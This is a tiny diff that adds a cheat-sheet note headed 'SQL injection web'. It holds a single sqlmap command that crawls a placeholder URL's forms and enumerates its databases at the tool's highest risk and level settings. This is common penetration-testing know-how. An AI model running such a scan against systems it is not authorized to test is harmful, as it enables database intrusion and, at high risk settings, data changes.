@@ -1,0 +1,3 @@
+SQL injection web
+
+$ sqlmap -u URL --forms --random-agent --threads 10 --level 3 --risk 3 --dbs
